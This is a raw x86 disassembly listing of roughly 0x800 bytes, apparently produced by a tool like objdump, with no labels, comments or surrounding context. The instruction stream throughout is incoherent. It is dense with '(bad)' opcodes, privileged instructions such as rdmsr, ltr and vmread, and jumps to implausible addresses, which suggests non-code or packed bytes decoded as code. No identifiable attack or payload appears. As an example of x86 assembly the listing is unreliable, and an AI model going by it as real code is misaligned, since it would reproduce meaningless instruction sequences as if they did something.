  4313cd:	add    DWORD PTR [ebx],esi
  4313cf:	add    BYTE PTR [ebx],al
  4313d1:	test   DWORD PTR [ebx],esi
  4313d3:	(bad)  
  4313d4:	inc    WORD PTR [ebp+0x0]
  4313d8:	mov    eax,DWORD PTR [eax]
  4313da:	call   0x8898cb0f
  4313df:	mov    esi,eax
  4313e1:	clc    
  4313e2:	ret    
  4313e3:	rol    cl,0xa
  4313e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313ec:	mov    edx,edi
  4313ee:	pushf  
  4313ef:	pop    es
  4313f0:	jmp    FWORD PTR [edx+0x66]
  4313f3:	add    BYTE PTR [ebp-0x990175],al
  4313f9:	inc    ebp
  4313fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431400:	push   ebp
  431401:	mov    edi,eax
  431403:	mov    dh,BYTE PTR [eax+0x266ff51]
  431409:	push   ebp
  43140a:	add    BYTE PTR [ebx-0x764b0777],al
  431410:	dec    DWORD PTR [esi+0x661851e8]
  431416:	add    BYTE PTR [ebp-0x7b],dl
  431419:	cmp    esi,0xfffffffb
  43141c:	dec    DWORD PTR [ecx+0x51fe9285]
  431422:	jmp    DWORD PTR [esi-0x75]
  431425:	push   ebp
  431426:	hlt    
  431427:	data16 (bad) 
  431429:	dec    ebp
  43142a:	ret    
  43142b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431431:	lea    edx,[eax-0x1]
  431434:	jne    0x431407
  431436:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43143c:	dec    BYTE PTR [ecx+0x51559eff]
  431442:	mov    DWORD PTR [esi-0x4c],esp
  431445:	push   ebp
  431446:	jmp    DWORD PTR [esi-0x18]
  431449:	inc    ebp
  43144a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431450:	(bad)  
  431451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431452:	inc    eax
  431454:	test   DWORD PTR [esi-0x2],esp
  431457:	inc    ebp
  431458:	dec    DWORD PTR [ebp-0x760bde75]
  43145e:	(bad)  
  43145f:	test   al,0xc3
  431461:	mov    DWORD PTR [ebp-0x769b56],ecx
  431467:	lods   al,BYTE PTR ds:[esi]
  431468:	push   eax
  431469:	inc    ebp
  43146a:	jne    0x43147b
  43146c:	dec    DWORD PTR [ebp+0x8]
  43146f:	mov    ecx,DWORD PTR [ebx]
  431471:	sbb    al,0x0
  431473:	(bad)  
  431474:	mov    eax,0xc14fc3
  431479:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43147f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431483:	xor    eax,DWORD PTR [eax]
  431485:	add    eax,edi
  431487:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43148d:	xor    edi,DWORD PTR [eax+0x854f66]
  431493:	dec    BYTE PTR [ecx-0x76bb01]
  431499:	mov    BYTE PTR [ebx-0x76724001],al
  43149f:	pushf  
  4314a0:	inc    esi
  4314a1:	(bad)  
  4314a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4314a8:	sar    esi,0x89
  4314ab:	dec    DWORD PTR [eax+0x0]
  4314ae:	inc    DWORD PTR [eax]
  4314b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4314b7:	xlat   BYTE PTR ds:[ebx]
  4314b8:	dec    edx
  4314b9:	add    bh,bh
  4314bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4314c1:	lea    esp,[esi-0x50]
  4314c4:	(bad)  
  4314c5:	(bad)  
  4314c6:	call   DWORD PTR [eax-0x1]
  4314c9:	inc    ebp
  4314ca:	rdpmc  
  4314cc:	add    BYTE PTR [ebx],al
  4314ce:	push   ax
  4314d0:	lea    eax,[ebp-0x1]
  4314d6:	js     0x4314d7
  4314d8:	add    al,bh
  4314da:	push   bp
  4314dc:	lea    ecx,[ebp-0x7701]
  4314e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4314e8:	(bad)  
  4314e9:	(bad)  
  4314ea:	(bad)  
  4314eb:	(bad)  
  4314ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4314f2:	dec    eax
  4314f3:	mov    eax,0x8d8dffff
  4314f8:	mov    al,0xb0
  4314fa:	(bad)  
  4314fb:	call   DWORD PTR [ecx+0x50]
  4314fe:	dec    ebp
  4314ff:	inc    ebp
  431500:	mov    esi,0x7030833
  431505:	push   eax
  431506:	into   
  431507:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43150d:	call   DWORD PTR [ecx-0x8]
  431510:	lea    edx,[ebp-0x1]
  431513:	jmp    0x761717
  431518:	inc    eax
  431519:	jnp    0x4314a8
  43151b:	add    dh,bh
  43151d:	inc    WORD PTR [ebp-0x8a00b0]
  431524:	mov    edx,eax
  431526:	inc    esp
  431527:	add    bh,bh
  431529:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43152f:	dec    DWORD PTR [ebx-0x7f820301]
  431535:	add    BYTE PTR [ecx],al
  431537:	data16 add BYTE PTR [ebp-0xb30077],al
  43153e:	inc    eax
  431540:	(bad)  
  431541:	dec    si
  431543:	test   edi,edi
  431545:	(bad)  
  431546:	cmp    edi,edi
  431548:	add    ecx,DWORD PTR [edi-0x39]
  43154b:	mov    edx,DWORD PTR [edx+0x66]
  43154e:	inc    DWORD PTR [ebp-0x3d00cb]
  431554:	mov    eax,0x66ff8b5e
  43155a:	jmp    0xb4ff:0xc7ff3895
  431561:	push   ecx
  431562:	inc    DWORD PTR [ebx-0x76ffccbb]
  431568:	call   DWORD PTR [esi-0x1]
  43156b:	dec    DWORD PTR [eax]
  43156d:	mov    ecx,0x805ff
  431572:	inc    ebp
  431573:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431579:	mov    ecx,0x35784
  43157e:	add    BYTE PTR [ecx-0xffa59b],cl
  431584:	inc    ebp
  431585:	mov    ecx,0x9c6131
  43158a:	(bad)  
  43158b:	mov    eax,ebx
  43158d:	pop    esp
  43158e:	test   edi,edi
  431590:	clc    
  431591:	lea    eax,[ebp-0x24]
  431594:	cmp    eax,0xc7fe9c8d
  431599:	push   eax
  43159b:	lea    eax,[ebp+0x45fff8fe]
  4315a1:	mov    esi,DWORD PTR [ecx]
  4315a3:	hlt    
  4315a4:	lahf   
  4315a5:	push   esp
  4315a6:	mov    edx,DWORD PTR [ecx-0x4]
  4315a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4315af:	add    BYTE PTR [ebp-0x35],al
  4315b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4315b8:	mov    edx,DWORD PTR [ecx-0x74]
  4315bb:	rol    BYTE PTR [eax],0x8d
  4315be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4315c2:	nop
  4315c3:	push   ecx
  4315c4:	add    bh,bh
  4315c6:	mov    esp,edi
  4315c8:	in     al,0x85
  4315ca:	jge    0x4315ca
  4315cc:	test   edi,edi
  4315ce:	jne    0x431555
  4315d0:	(bad)  
  4315d1:	(bad)  
  4315d2:	sbb    bh,bh
  4315d4:	push   ebp
  4315d5:	inc    ebp
  4315d6:	call   0xffdc1066
  4315db:	add    BYTE PTR [ebp+0x66],al
  4315de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4315e4:	cmp    al,0x85
  4315e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4315ea:	test   DWORD PTR [edi+0x74],ecx
  4315ed:	dec    edi
  4315ee:	inc    DWORD PTR [ebp-0x530004]
  4315f4:	dec    DWORD PTR [edi-0x75]
  4315f7:	dec    esi
  4315f8:	cld    
  4315f9:	test   DWORD PTR [eax+0xff01ff],eax
  4315ff:	icebp  
  431600:	add    BYTE PTR [edi-0x3a],cl
  431603:	test   ebx,eax
  431605:	inc    BYTE PTR [ebp-0x1]
  431608:	jne    0x43160a
  43160a:	mov    eax,DWORD PTR [eax]
  43160c:	cld    
  43160d:	xor    BYTE PTR [ecx+0x500155],cl
  431613:	push   ebp
  431614:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43161a:	add    BYTE PTR [ebp+0x35e90f50],al
  431620:	add    al,BYTE PTR [eax]
  431622:	add    BYTE PTR [ebx-0x38fe4f80],al
  431628:	add    ah,ch
  43162a:	or     BYTE PTR [ebp+0x4501f845],dh
  431630:	jmp    0xdf1926
  431635:	(bad)  
  431636:	nop    ecx
  431639:	test   DWORD PTR [ebp+0x4502f8],eax
  43163f:	xor    ecx,DWORD PTR [ebp-0x64]
  431642:	mov    eax,edi
  431644:	mov    ebx,DWORD PTR [eax+edx*2]
  431647:	add    eax,0x45fef885
  43164c:	dec    DWORD PTR [ebx+0x339445]
  431652:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431658:	dec    DWORD PTR [ebx-0x460f0375]
  43165e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43165f:	add    esi,edi
  431661:	add    bh,bh
  431663:	rdpmc  
  431665:	add    BYTE PTR [ebx],0x1
  431668:	mov    DWORD PTR [eax],eax
  43166a:	add    al,0x45
  43166c:	dec    DWORD PTR [ecx-0x360b3373]
  431672:	dec    DWORD PTR [esi]
  431674:	push   eax
  431675:	jne    0x4316bc
  431677:	mov    esi,DWORD PTR [ebx]
  431679:	cld    
  43167a:	add    esp,ecx
  43167c:	push   eax
  43167d:	inc    DWORD PTR [ebp-0x75]
  431680:	add    eax,0x800e4
  431685:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43168b:	mov    DWORD PTR [ecx],eax
  43168d:	sbb    al,0x0
  43168f:	leave  
  431690:	test   DWORD PTR [edi-0x2],eax
  431693:	jne    0x431694
  431695:	call   0xff44009a
  43169a:	xor    BYTE PTR [ebp+0x4d],al
  43169d:	mov    edi,edi
  43169f:	enter  0x8,0x4d
  4316a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4316a9:	mov    eax,DWORD PTR [eax]
  4316ab:	cld    
  4316ac:	add    DWORD PTR [ecx],ebx
  4316ae:	inc    ebp
  4316af:	dec    ebp
  4316b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4316b6:	inc    eax
  4316b7:	dec    DWORD PTR [ecx-0x270375]
  4316bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4316c3:	xchg   ecx,eax
  4316c4:	ret    
  4316c5:	add    BYTE PTR [ebp-0x830075],al
  4316cb:	add    BYTE PTR [ebp-0x75],al
  4316ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4316d4:	lea    edi,[edi-0xc]
  4316d7:	add    bh,bh
  4316d9:	mov    edx,DWORD PTR [eax-0x7b]
  4316dc:	inc    ebp
  4316dd:	rdpmc  
  4316df:	jne    0x4316e4
  4316e1:	add    BYTE PTR [eax-0x75],dl
  4316e4:	inc    ebp
  4316e5:	clc    
  4316e6:	add    eax,0x400009
  4316eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316f1:	mov    eax,DWORD PTR [ecx]
  4316f3:	in     al,dx
  4316f4:	add    dh,al
  4316f6:	test   ebx,eax
  4316f8:	inc    BYTE PTR [ebp-0xff0001]
  4316fe:	add    BYTE PTR [ebp-0x43],al
  431701:	cmp    esi,0xfffffff8
  431704:	(bad)  
  431705:	push   DWORD PTR [eax]
  431707:	add    BYTE PTR [ebp-0x3a],dl
  43170a:	test   ebx,eax
  43170c:	je     0x431693
  43170e:	mov    edi,edi
  431710:	sbb    al,0xff
  431712:	test   DWORD PTR gs:[eax],eax
  431715:	(bad)  
  431716:	js     0x431717
  431718:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43171e:	sub    eax,ebx
  431720:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431726:	add    eax,DWORD PTR [eax]
  431728:	dec    ebp
  431729:	push   eax
  43172a:	mov    al,BYTE PTR [ebp+0x1]
  43172d:	mov    eax,DWORD PTR [ebp-0x68]
  431730:	mov    eax,DWORD PTR [eax]
  431732:	sbb    bh,al
  431734:	or     ah,dh
  431736:	dec    ebp
  431737:	inc    DWORD PTR [eax+0x4]
  43173a:	push   ecx
  43173b:	add    BYTE PTR [edx-0x1],dh
  43173e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431744:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43174e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431754:	push   ecx
  431755:	cmp    BYTE PTR [ebx],al
  431757:	inc    ebp
  431758:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43175e:	(bad)  
  43175f:	(bad)  
  431760:	in     al,0xff
  431762:	add    BYTE PTR [ebp+0x0],al
  431765:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43176b:	add    al,bh
  43176d:	(bad)  
  43176e:	jmp    0x8d85:0x74b0558d
  431775:	dec    DWORD PTR [eax]
  431777:	call   DWORD PTR [ebp-0x7b]
  43177a:	mov    edi,esi
  43177c:	lock call DWORD PTR [ebp-0x75]
  431780:	mov    esi,esp
  431782:	mov    ah,0xc6
  431784:	mov    bh,0xc3
  431786:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43178c:	add    DWORD PTR [eax],0x450050ff
  431792:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431798:	inc    edi
  43179a:	push   esp
  43179c:	jmp    0xcd00:0x650481ff
  4317a3:	mov    DWORD PTR [ebx],esi
  4317a5:	clc    
  4317a6:	cmp    edi,0xff9cff3c
  4317ac:	jne    0x4317b6
  4317ae:	mov    eax,eax
  4317b0:	add    esi,DWORD PTR [eax]
  4317b2:	int3   
  4317b3:	inc    ebp
  4317b4:	cmp    al,0x83
  4317b6:	add    BYTE PTR [eax],bl
  4317b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4317be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4317c4:	mov    edi,eax
  4317c6:	cmp    BYTE PTR [ebp+0x45],cl
  4317c9:	jmp    0x431756
  4317cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4317ce:	inc    ebp
  4317cf:	or     al,0x2
  4317d1:	dec    DWORD PTR [ebp+0x18]
  4317d4:	jne    0x43182b
  4317d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317dc:	mov    edi,DWORD PTR [ebx]
  4317de:	in     al,0x50
  4317e0:	xchg   ecx,eax
  4317e1:	jmp    0x34366e6
  4317e6:	adc    al,0x8b
  4317e8:	inc    ebp
  4317e9:	mov    al,ds:0x8b04008b
  4317ee:	push   ebp
  4317ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317f5:	push   ebp
  4317f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317fc:	inc    ebp
  4317fd:	dec    ebp
  4317fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431804:	mov    DWORD PTR [eax],0xe9ff00f4
  43180a:	add    al,0x0
  43180c:	add    BYTE PTR [eax],al
  43180e:	mov    eax,edx
  431810:	push   eax
  431811:	rol    DWORD PTR [ebp-0xf0177],1
  431817:	bound  eax,QWORD PTR [ebp+0x50]
  43181a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431820:	add    BYTE PTR [ecx+0x558df0ff],cl
  431826:	mov    al,0xf
  431828:	test   DWORD PTR [edx],edx
  43182a:	call   DWORD PTR [ebp-0x7a0001]
  431830:	(bad)  
  431831:	loop   0x431832
  431833:	jnp    0xc6990c39
  431839:	mov    eax,ebx
  43183b:	cmp    al,0x8b
  43183d:	(bad)  
  43183e:	cld    
  43183f:	shr    esi,0xc
  431842:	add    dl,al
  431844:	push   eax
  431845:	lea    eax,[ebp-0x1]
  431848:	mov    edx,esi
  43184a:	cwde   
  43184b:	cli    
  43184c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431852:	or     BYTE PTR [eax],cl
  431854:	inc    ebp
  431855:	dec    ebp
  431856:	inc    DWORD PTR [ebx+0x74803914]
  43185c:	add    DWORD PTR [ebx+0x451800],ecx
  431862:	call   DWORD PTR [eax+edx*1]
  431865:	add    ecx,DWORD PTR [ebp-0x34]
  431868:	push   edi
  431869:	adc    al,0x8
  43186b:	mov    edx,DWORD PTR [ebp-0x14]
  43186e:	mov    ecx,DWORD PTR [ebp+0x18]
  431871:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431875:	inc    DWORD PTR [eax+esi*8]
  431878:	inc    ebp
  431879:	stos   BYTE PTR es:[edi],al
  43187a:	mov    edx,DWORD PTR [ebp-0x4]
  43187d:	add    DWORD PTR [ebp-0x1c],eax
  431880:	mov    edx,DWORD PTR [ebp-0x70]
  431883:	cmp    eax,DWORD PTR [eax]
  431885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431886:	mov    eax,DWORD PTR [eax]
  431888:	cld    
  431889:	jae    0x43180b
  43188b:	add    eax,DWORD PTR [ecx]
  43188d:	clc    
  43188e:	add    BYTE PTR [eax+0x30],dl
  431891:	mov    DWORD PTR [ecx],esi
  431893:	clc    
  431894:	pop    ds
  431895:	inc    ebp
  431896:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43189c:	(bad)  
  43189d:	push   DWORD PTR [edi]
  43189f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4318a5:	(bad)  
  4318a6:	jae    0x4318a7
  4318a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4318ae:	sub    eax,DWORD PTR [eax]
  4318b0:	add    eax,DWORD PTR [eax]
  4318b2:	mov    DWORD PTR [ecx+0x5f],eax
  4318b5:	mov    DWORD PTR [ebx-0x4],ebx
  4318b8:	ret    0xff
  4318bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4318c1:	ret    
  4318c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4318c8:	add    BYTE PTR [ebp-0x7d],al
  4318cb:	mov    DWORD PTR [eax],eax
  4318cd:	add    al,0x84
  4318cf:	inc    DWORD PTR [ecx]
  4318d1:	lea    eax,[eax]
  4318d3:	hlt    
  4318d4:	sar    bh,cl
  4318d6:	test   BYTE PTR [eax+0x1],dl
  4318d9:	inc    ebp
  4318da:	add    BYTE PTR [ebx],dh
  4318dc:	test   BYTE PTR [ebx],0x84
  4318df:	push   eax
  4318e0:	add    BYTE PTR [ebp+0x0],al
  4318e3:	add    eax,0x86
  4318e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318ee:	add    BYTE PTR [ecx],al
  4318f0:	add    BYTE PTR [eax],al
  4318f2:	mov    esi,0x550030
  4318f7:	mov    ecx,DWORD PTR [edi]
  4318f9:	cld    
  4318fa:	fidiv  DWORD PTR [ebp+0x0]
  4318fd:	mov    edi,DWORD PTR [ecx]
  4318ff:	xor    BYTE PTR [eax+eax*1],0x84
  431903:	add    eax,DWORD PTR [eax]
  431905:	sbb    BYTE PTR [eax],al
  431907:	jne    0x4318ba
  431909:	mov    eax,DWORD PTR [ecx]
  43190b:	sbb    BYTE PTR [eax],al
  43190d:	mov    DWORD PTR [ebp-0x1],esp
  431910:	add    BYTE PTR [eax+0x30e45ca],bh
  431916:	ret    0xb7fc
  431919:	dec    ebp
  43191a:	or     al,0x89
  43191c:	dec    ebp
  43191d:	cld    
  43191e:	cmovne ecx,DWORD PTR [eax-0x75]
  431922:	add    edi,esp
  431924:	seto   BYTE PTR [esi-0x72ffffff]
  43192b:	inc    ebp
  43192c:	adc    al,0x8b
  43192e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431935:	cmp    DWORD PTR [edi+0x72],edx
  431938:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  43193e:	gs cmp al,0x0
  431941:	je     0x431919
  431943:	push   eax
  431944:	sar    BYTE PTR [eax],1
  431946:	mov    bh,0x3e
  431948:	push   cs
  431949:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  43194f:	add    DWORD PTR [ecx+0x12],ebp
  431952:	dec    edx
  431953:	(bad)  
  431954:	mov    eax,edx
  431956:	in     al,dx
  431957:	adc    DWORD PTR [ecx],esi
  431959:	pop    esi
  43195a:	inc    ecx
  43195b:	leave  
  43195c:	or     DWORD PTR [eax],ebx
  43195e:	gs push ebp
  431960:	add    ah,ch
  431962:	into   
  431963:	in     al,dx
  431964:	enter  0xb756,0xf0
  431968:	push   cs
  431969:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431973:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431979:	jnp    0x74439e81
  43197f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431985:	add    BYTE PTR [edi],cl
  431987:	mov    edi,DWORD PTR [ecx-0x78]
  43198a:	ltr    WORD PTR [ecx-0x7b]
  43198e:	dec    DWORD PTR [edi]
  431990:	clc    
  431991:	out    0x45,eax
  431993:	add    BYTE PTR [eax],cl
  431995:	cmp    ebx,0xffffff8c
  431998:	jge    0x43199a
  43199a:	jb     0x4319ac
  43199c:	je     0x521a1c
  4319a2:	pop    edx
  4319a3:	push   esi
  4319a4:	mov    ecx,DWORD PTR [edi]
  4319a6:	in     al,dx
  4319a7:	rol    DWORD PTR [ebp+0x0],1
  4319aa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4319b1:	cmp    DWORD PTR [ecx],0xfffffff0
  4319b4:	hlt    
  4319b5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4319bb:	(bad)  
  4319bd:	push   eax
  4319be:	jns    0xb842fe3c
  4319c4:	lock push cs
  4319c6:	ror    edx,0x3
  4319c9:	test   BYTE PTR [ecx+0x5500e800],cl
  4319cf:	dec    eax
  4319d0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4319d4:	(bad)  
  4319d5:	mov    esi,0x7f33ff5f
  4319da:	inc    eax
  4319db:	test   DWORD PTR [edx],eax
  4319dd:	je     0x43199f
  4319df:	mov    ecx,ecx
  4319e1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319e5:	and    eax,DWORD PTR [eax+0xf0103]
  4319eb:	jp     0x4319d9
  4319ed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319f1:	add    edx,DWORD PTR [edi+0x74]
  4319f4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319fa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a00:	je     0x431985
  431a02:	cmp    eax,edi
  431a04:	js     0x431a29
  431a06:	add    eax,0xeb0fc003
  431a0b:	jns    0x431998
  431a0d:	vmread DWORD PTR [ecx+0x45],ebx
  431a11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a17:	adc    al,0x8b
  431a19:	jge    0x431a2f
  431a1b:	mov    edi,DWORD PTR [eax-0x4]
  431a1e:	add    edi,DWORD PTR [edi]
  431a20:	or     bh,bh
  431a22:	push   ebp
  431a23:	push   es
  431a24:	mov    DWORD PTR [ebp-0x4],ebx
  431a27:	add    edi,esi
  431a29:	pop    es
  431a2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431a30:	mov    DWORD PTR [esp+esi*8],ecx
  431a33:	inc    ebp
  431a34:	pop    ebp
  431a35:	xor    DWORD PTR [esi-0x4],0x3b
  431a39:	add    edx,DWORD PTR [ecx+edi*1]
  431a3c:	push   es
  431a3d:	clc    
  431a3e:	mov    bh,0xdb
  431a40:	jp     0x4319f9
  431a42:	add    cl,BYTE PTR [esi]
  431a44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a4a:	test   edi,edi
  431a4c:	je     0x431a42
  431a4e:	mov    eax,ecx
  431a50:	or     BYTE PTR [ebx],al
  431a52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a58:	jbe    0x431acc
  431a5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a60:	add    ecx,DWORD PTR [esi]
  431a62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a68:	add    eax,DWORD PTR [ebx-0x287af783]
  431a6e:	je     0x431abd
  431a70:	mov    DWORD PTR [ecx],edi
  431a72:	mov    esi,eax
  431a74:	hlt    
  431a75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a7c:	jb     0x431a3e
  431a7e:	jmp    0x431a6b
  431a80:	xor    esi,DWORD PTR [ebx]
  431a82:	pop    edi
  431a83:	pop    esi
  431a84:	pop    ebx
  431a85:	ret    
  431a86:	ret    0x8b
  431a89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a8f:	xor    DWORD PTR [ecx],0xc
  431a92:	pushf  
  431a93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a99:	rdmsr  
  431a9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431aa2:	dec    ebp
  431aa3:	ret    
  431aa4:	mov    edi,DWORD PTR [esi-0x4]
  431aa7:	pop    eax
  431aa8:	dec    ebp
  431aa9:	jne    0x431a36
  431aab:	xor    edi,esp
  431aad:	inc    eax
  431aae:	dec    ebp
  431aaf:	jbe    0x431b04
  431ab1:	inc    eax
  431ab2:	pop    ebp
  431ab3:	add    edx,DWORD PTR [esi+0x8]
  431ab6:	push   esp
  431ab7:	dec    eax
  431ab8:	push   ecx
  431ab9:	mov    eax,edi
  431abb:	and    al,0xf0
  431abd:	jo     0x431aaa
  431abf:	mov    eax,DWORD PTR [ebx]
  431ac1:	sbb    BYTE PTR [ebp+0x4d],cl
  431ac4:	mov    eax,DWORD PTR [ebx]
  431ac6:	nop
  431ac7:	or     BYTE PTR [eax],al
  431ac9:	jne    0x431b22
  431acb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431ad1:	cld    
  431ad2:	xor    edi,edi
  431ad4:	add    edi,DWORD PTR [ebp+0x3]
  431ad7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431add:	js     0x431a63
  431adf:	jae    0x431ae3
  431ae1:	(bad)  
  431ae3:	xor    al,0x5d
  431ae5:	jmp    0x431a72
  431ae7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431aee:	fdecstp 
  431af0:	test   BYTE PTR [edi],ah
  431af2:	add    bh,BYTE PTR [ebp+0x0]
  431af5:	add    ebx,DWORD PTR [ebp-0x77]
  431af8:	mov    edi,eax
  431afa:	cmp    al,0x0
  431afd:	adc    dh,BYTE PTR [ebx]
  431aff:	jge    0x431b04
  431b01:	mov    edi,DWORD PTR [ebx]
  431b03:	jl     0x431b14
  431b05:	clc    
  431b06:	dec    edi
  431b07:	jge    0x431b09
  431b09:	mov    eax,DWORD PTR [ebx]
  431b0b:	jb     0x431b15
  431b0d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b10:	mov    edi,edi
  431b12:	xor    edx,DWORD PTR [eax]
  431b14:	add    edi,DWORD PTR [ebx]
  431b16:	mov    DWORD PTR [ebp-0x10],edi
  431b19:	inc    edi
  431b1a:	pop    ebp
  431b1b:	jge    0x431b58
  431b1d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431b21:	mov    edx,0xc05d87f0
  431b26:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431b2a:	fimul  WORD PTR [eax]
  431b2c:	fist   WORD PTR [ebp+0x1c]
  431b2f:	in     al,dx
  431b30:	jne    0x431b1e
  431b32:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431b38:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431b3c:	fdivp  st(0),st
  431b3e:	fild   WORD PTR [ebp+0x4510f85c]
  431b44:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431b4a:	inc    ebp
  431b4b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431b51:	mov    ebp,DWORD PTR [ebx-0x4]
  431b54:	adc    al,0x8b
  431b56:	rcl    DWORD PTR [eax],0x48
  431b59:	mov    esi,0x7080803
  431b5e:	fiadd  WORD PTR [ebp+0x4d]
  431b61:	(bad)  
  431b62:	mov    edx,DWORD PTR [edx-0x4]
  431b65:	mov    edx,DWORD PTR [ebp-0x4]
  431b68:	xor    ebx,DWORD PTR [ebx+0x330103]
  431b6e:	mov    DWORD PTR [edi+0x872dc],edi
  431b74:	xlat   BYTE PTR ds:[ebx]
  431b75:	into   
  431b76:	ffreep st(6)
  431b78:	retf   0x6c7
  431b7b:	iret   
  431b7c:	dec    ebp
  431b7d:	inc    ebp
  431b7e:	mov    DWORD PTR [ebx],edi
  431b80:	fmul   QWORD PTR [edi]
  431b82:	dec    ebp
  431b83:	jnp    0x431bb8
  431b85:	add    BYTE PTR [ebx],al
  431b87:	mov    ecx,DWORD PTR [esp+edi*8]
  431b8a:	inc    ebp
  431b8b:	dec    ebp
  431b8c:	lea    esi,[ebx]
  431b8e:	add    DWORD PTR [ebx],eax
  431b90:	jb     0x431bcd
  431b92:	add    BYTE PTR [edi],cl
  431b94:	inc    ebp
  431b95:	imul   eax,edi,0x858bd800
  431b9b:	cld    
  431b9c:	clc    
  431b9d:	mov    DWORD PTR [ebp+0x0],eax
  431ba0:	inc    DWORD PTR [eax]
  431ba2:	or     al,0xde
  431ba4:	sbb    bh,0x1
  431ba7:	retf   
  431ba8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431baf:	dec    ebp
  431bb0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431bb6:	enter  0x12de,0xdf
  431bba:	inc    ebp
  431bbb:	pop    ebp
  431bbc:	dec    DWORD PTR [ebx-0x257f0ff4]
  431bc2:	add    DWORD PTR [edx],edx
  431bc4:	add    BYTE PTR [ebp+0x50],dl
  431bc7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431bcd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431bd3:	or     ah,al
  431bd5:	pop    ss
  431bd6:	cdq    
  431bd7:	push   ebp
  431bd8:	clc    
  431bd9:	mov    eax,DWORD PTR [ebp-0x4]
  431bdc:	xor    edx,edx
  431bde:	add    esi,DWORD PTR [ebx]
  431be0:	cmp    eax,DWORD PTR [ebx]
  431be2:	hlt    
